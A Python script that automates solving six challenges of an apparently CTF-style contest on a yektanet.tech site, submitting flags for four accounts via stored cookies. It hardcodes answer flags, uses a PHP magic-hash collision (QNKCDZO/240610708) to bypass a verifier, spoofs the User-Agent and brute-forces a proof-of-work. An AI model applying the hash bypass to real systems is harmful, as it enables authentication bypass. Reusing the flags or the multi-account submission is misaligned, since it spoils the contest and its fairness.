import sys
import http.cookiejar
import requests
import json
import time
import os
import ctypes

COOKIE_ACCOUNTS = [
    ("متین بیگی (m4tinbeigi)", "/Users/ricksabchez/workspace/ramzolmasal_cookies.txt"),
    ("ریک سانچز (Rick Sanchez)", "/Users/ricksabchez/workspace/ramzolmasal_cookies_rick.txt"),
    ("یگانه (Yeganeh)", "/Users/ricksabchez/workspace/ramzolmasal_cookies_yeganeh.txt"),
    ("ابراهیمی (Ebrahimi)", "/Users/ricksabchez/workspace/ramzolmasal_cookies_ebrahimi.txt"),
]

def fnv1a_32(data: bytes) -> int:
    h = 0x811c9dc5
    for b in data:
        h ^= b
        h = (h * 0x01000193) & 0xFFFFFFFF
    return h

def process_account(account_name, cookie_file):
    if not os.path.exists(cookie_file):
        print(f"\n[!] Cookie file does not exist: {cookie_file}")
        return

    print(f"\n=======================================================")
    print(f"🚀 شروع حل مراحل برای اکانت: {account_name}")
    print(f"=======================================================")

    session = requests.Session()
    cj = http.cookiejar.MozillaCookieJar(cookie_file)
    cj.load(ignore_discard=True, ignore_expires=True)
    session.cookies = cj

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    try:
        me = session.get("https://256.yektanet.tech/ramzolmasal/api/me", headers=headers, timeout=10).json()
        print(f"👤 کاربر: {me.get('nickname', 'نامشخص')} | شماره: {me.get('masked_phone', 'N/A')}")
        solved_list = set(me.get('solved', []))
        print(f"✅ مراحل حل‌شده تاکنون ({len(solved_list)}): {list(solved_list)}")
    except Exception as e:
        print(f"خطا در دریافت مشخصات کاربر: {e}")
        return

    def submit_flag(chal_id, flag):
        print(f"  📤 در حال ثبت پرچم برای {chal_id}: {flag}")
        session.post("https://256.yektanet.tech/ramzolmasal/api/select", json={"id": chal_id}, headers=headers, timeout=10)
        time.sleep(1)
        while True:
            try:
                r = session.post("https://256.yektanet.tech/ramzolmasal/api/submit", json={"challenge_id": chal_id, "flag": flag}, headers=headers, timeout=10)
                res = r.json()
                if "زیادی تند" in res.get("error", ""):
                    time.sleep(6)
                    continue
                if res.get("correct"):
                    print(f"  🎉 موفقیت! مرحله {chal_id} حل شد.")
                    return True
                else:
                    print(f"  ❌ پاسخ اشتباه یا خطا: {res}")
                    return False
            except Exception as ex:
                print(f"  خطا در سابمیت: {ex}")
                return False

    # 1. تاتی تاتی (tati-tati)
    if "tati-tati" not in solved_list:
        print("\n🔹 [1/6] حل تاتی تاتی...")
        if submit_flag("tati-tati", "YEK{YektaNet}"):
            solved_list.add("tati-tati")
        time.sleep(3)

    # 2. سرگیجه (sargijeh)
    if "sargijeh" not in solved_list:
        print("\n🔹 [2/6] حل سرگیجه...")
        if submit_flag("sargijeh", "YEK{welcome_to_tanzolmasal}"):
            solved_list.add("sargijeh")
        time.sleep(3)

    # 3. نگهبان دربار (negahban)
    if "negahban" not in solved_list:
        print("\n🔹 [3/6] حل نگهبان دربار...")
        try:
            r_neg = session.post("https://256.yektanet.tech/ramzolmasal/api/negahban/verify", json={"doc1": "QNKCDZO", "doc2": "240610708"}, headers=headers, timeout=10).json()
            print("  پاسخ سرور نگهبان:", r_neg)
            flag = r_neg.get("flag") or r_neg.get("freedom_key")
            if flag:
                if submit_flag("negahban", flag):
                    solved_list.add("negahban")
        except Exception as e:
            print(f"  خطا در مرحله نگهبان: {e}")
        time.sleep(3)

    # 4. ارزش نبات (nabat)
    if "nabat" not in solved_list:
        print("\n🔹 [4/6] حل ارزش نبات...")
        try:
            nab_headers = headers.copy()
            nab_headers["User-Agent"] = "khar"
            r_nab = session.get("https://256.yektanet.tech/ramzolmasal/api/price?product_name=نبات", headers=nab_headers, timeout=10).json()
            print("  پاسخ قیمت قناد:", r_nab)
            price = r_nab.get("price")
            if price:
                if submit_flag("nabat", f"YEK{{{price}}}"):
                    solved_list.add("nabat")
        except Exception as e:
            print(f"  خطا در مرحله نبات: {e}")
        time.sleep(3)

    # 5. کلاغ (kalagh)
    if "kalagh" not in solved_list:
        print("\n🔹 [5/6] حل کلاغ (ماینینگ ۴۰ کلاغ)...")
        try:
            chal = session.get("https://256.yektanet.tech/ramzolmasal/api/challenges/kalagh", headers=headers, timeout=10).json()
            token = chal.get("token") or ""
            print(f"  توکن اولیه کلاغ: {token}")
            
            for crow_num in range(1, 41):
                found = False
                for nonce in range(5000000):
                    test_str = f"{token}:{nonce}".encode()
                    h = fnv1a_32(test_str)
                    if (h & 0xFFF) == 0:
                        r_hop = session.post("https://256.yektanet.tech/ramzolmasal/api/kalagh/hop", json={"nonce": nonce, "token": token}, headers=headers, timeout=10).json()
                        if r_hop.get("flag"):
                            print(f"  🦅 پرچم کلاغ چهلم به دست آمد: {r_hop.get('flag')}")
                            if submit_flag("kalagh", r_hop.get("flag")):
                                solved_list.add("kalagh")
                            found = True
                            break
                        elif r_hop.get("next_token"):
                            token = r_hop.get("next_token")
                            if crow_num % 10 == 0:
                                print(f"    کلاغ {crow_num}/40 رد شد...")
                            found = True
                            break
                if not found:
                    print(f"  توقف در کلاغ شماره {crow_num}")
                    break
        except Exception as e:
            print(f"  خطا در ماینینگ کلاغ: {e}")
        time.sleep(3)

    # 6. شاهد روباه (shahed)
    if "shahed" not in solved_list:
        print("\n🔹 [6/6] حل شاهد روباه...")
        try:
            # Send witness token / request
            r_sh = session.post("https://256.yektanet.tech/ramzolmasal/api/shahed/witness", headers=headers, timeout=10).json()
            print("  پاسخ شاهد:", r_sh)
            if r_sh.get("flag"):
                submit_flag("shahed", r_sh.get("flag"))
        except Exception as e:
            print(f"  خطا در مرحله شاهد: {e}")

    # Check updated status
    try:
        me_after = session.get("https://256.yektanet.tech/ramzolmasal/api/me", headers=headers, timeout=10).json()
        print(f"\n🏁 کارنامه نهایی {account_name}: {len(me_after.get('solved', []))} مرحله حل شده -> {me_after.get('solved', [])}")
    except:
        pass

if __name__ == "__main__":
    for acc_name, cookie_p in COOKIE_ACCOUNTS:
        process_account(acc_name, cookie_p)
